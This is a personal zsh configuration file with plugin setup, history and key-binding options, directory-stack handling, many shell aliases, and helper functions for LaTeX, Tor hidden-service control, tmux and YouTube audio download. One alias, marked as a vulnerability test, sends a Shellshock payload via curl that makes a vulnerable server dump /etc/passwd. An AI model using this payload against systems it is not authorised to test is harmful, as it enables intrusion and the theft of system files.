# The following lines were added by compinstall

source /usr/share/zsh/scripts/antigen/antigen.zsh

antigen use oh-my-zsh

antigen theme gentoo
#antigen theme kardan

antigen apply

#TEMP WORKAROUND
cd $HOME

#zstyle ':completion:*' completer _complete _ignored
zstyle ':completion:::*:default' menu no select list-colors ${(s.:.)LS_COLORS}
zstyle :compinstall filename '/home/francesco/.zshrc'

autoload -Uz compinit promptinit colors
autoload -U run-help
autoload run-help-git
alias help=run-help
compinit
promptinit
colors
#prompt walters

#history options
setopt hist_allow_clobber
setopt hist_ignore_dups
setopt hist_ignore_space
setopt hist_no_store
setopt hist_expire_dups_first
setopt hist_find_no_dups
setopt extended_history
setopt inc_append_history

HISTFILE=~/.histfile
HISTSIZE=50000
SAVEHIST=50000


unsetopt beep
unsetopt global_rcs


bindkey -e

typeset -A key

key[Home]=${terminfo[khome]}
key[End]=${terminfo[kend]}
key[Insert]=${terminfo[kich1]}
key[Delete]=${terminfo[kdch1]}
key[Up]=${terminfo[kcuu1]}
key[Down]=${terminfo[kcud1]}
key[Left]=${terminfo[kcub1]}
key[Right]=${terminfo[kcuf1]}
key[PageUp]=${terminfo[kpp]}
key[PageDown]=${terminfo[knp]}

# setup key accordingly
[[ -n "${key[Home]}"    ]]  && bindkey  "${key[Home]}"    beginning-of-line
[[ -n "${key[End]}"     ]]  && bindkey  "${key[End]}"     end-of-line
[[ -n "${key[Insert]}"  ]]  && bindkey  "${key[Insert]}"  overwrite-mode
[[ -n "${key[Delete]}"  ]]  && bindkey  "${key[Delete]}"  delete-char
#[[ -n "${key[Up]}"      ]]  && bindkey  "${key[Up]}"	  history-beginning-search-backward
#[[ -n "${key[Down]}"    ]]  && bindkey  "${key[Down]}"   history-beginning-search-forward
[[ -n "${key[Up]}"      ]]  && bindkey  "${key[Up]}"	  history-search-backward
[[ -n "${key[Down]}"    ]]  && bindkey  "${key[Down]}"   history-search-forward
[[ -n "${key[Left]}"    ]]  && bindkey  "${key[Left]}"   backward-char
[[ -n "${key[Right]}"   ]]  && bindkey  "${key[Right]}"  forward-char



 #DIRSTACK CONF

DIRSTACKFILE="$HOME/.cache/zsh/dirs"
if [[ -f $DIRSTACKFILE ]] && [[ $#dirstack -eq 0 ]]; then
	dirstack=( ${(f)"$(< $DIRSTACKFILE)"} )
	[[ -d $dirstack[1] ]] && cd $dirstack[1]
fi

chpwd() {
	print -l $PWD ${(u)dirstack} >$DIRSTACKFILE
}

DIRSTACKSIZE=20
setopt autopushd pushdsilent pushdtohome
## Remove duplicate entries
setopt pushdignoredups
### This reverts the +/- operators.
setopt pushdminus


alias ls='ls --color=auto'
alias ll='ls -lF --color=auto'
alias la='ls -a'
alias lla='ls -la'
alias vimtest='vim -u ~/.vimrctest'
alias gvim='gvim -geometry 55x39'
alias pingg='ping -c 3 www.google.com'
alias httppingg='curl -I http://google.com/ > /dev/null 2>&1 && echo success || echo failure'
alias lock-screen='xscreensaver-command -lock'
alias i3lock='i3lock -c 000000 -n'
alias xtime='date +%T'
alias connect_unict='ssh -v ubuntu@151.97.12.231'
alias mountt='sudo mount -t ntfs-3g $1 $2'
alias ntpsync='sudo ntpd -qg'
alias reboot='sudo systemctl reboot'
alias suspend='sudo systemctl suspend'
alias poweroff='sudo systemctl poweroff'
alias myip='curl ifconfig.me'
alias netctl-current='netctl list | grep "*"'
alias py2=python2.7
alias py3=python3
alias eclipse='eclipse -vmargs -Xmx1024M'
alias tmux='tmux -2'
alias tma='tmux attach -d -t'
alias git-tmux='tmux new -s $(basename $(pwd))'
alias nopaste="curl -F 'sprunge=<-' http://sprunge.us"
alias qemu='qemu-system-x86_64 -enable-kvm'
alias rss='newsbeuter -r'

#TEST VULN
alias vuln="curl -A '() { :; }; /bin/cat /etc/passwd > dumped_file' $1"


#GIT ALIASES
alias gl="git log --oneline --decorate"

#alias hiddensrv-start="sudo /usr/bin/thttpd -c /etc/thttpd.conf -d /srv/http/hiddensrv/"
#alias hiddensrv-stop="sudo kill -9 '$(pgrep thttpd)'"


export PATH="$PATH:$HOME/.rvm/bin" # Add RVM to PATH for scripting


export VISUAL="vim"
export EDITOR="vim"

#[[ -s "$HOME/.rvm/scripts/rvm" ]] && source "$HOME/.rvm/scripts/rvm"



#MY OLD BASHRC CONFIG FUNCTs

# ** TOR HIDDEN SERVICE **

alias hiddensrv-start="sudo /usr/bin/thttpd -c /etc/thttpd.conf -d /var/lib/tor/hiddensrv/"
#alias hiddensrv-stop="sudo kill -9 '$(pgrep thttpd)'"
function hiddensrv-stop(){
	pid=$(pgrep thttpd)
	if [ "$pid" == ""  ]; then
		echo "[thttpd] Service not running"
	else
		echo "[thttpd] Stop: $pid"
		sudo kill -9 $pid
	fi

}


#LATEX ALIASes
function texbuild(){
	filename=$(basename "$1")
	extension="${filename##*.}"
	filename="${filename%.*}"
	if [ -f "$1" ]; then
		latex $filename
		latex $filename
		echo "Making dvi.."
		dvips $filename.dvi #-o $filename.ps
		echo "Making ps.."
		ps2pdf $filename.ps
		echo "Making pdf"
		rm *.log *.ps *.dvi *.out *.aux
		#evince $filename.pdf
	fi
}

function ytdownload(){
	if [[ -z "$1" ]]; then
		echo "Usage:  ytdownload <URL>"
	else
		echo "[Retrieving media]"
		youtube-dl -x --audio-format mp3 $1 -o  $MUSIC_DIR'%(title)s.%(ext)s'
		#echo "Updating mpc"
		#mpc update
	fi
}

setup_tmux_layout() {
	# Create a new window.
	tmux new-window -a -n '$1'
        # Now split it twice, first horizontally and then  vertically.
        tmux split-window -h
        tmux split-window -v
}


tl(){
	if [[ -z "$1" ]]; then
		task list && task summary
	else
		task list project:$1 && task summary project:$1
	fi
}
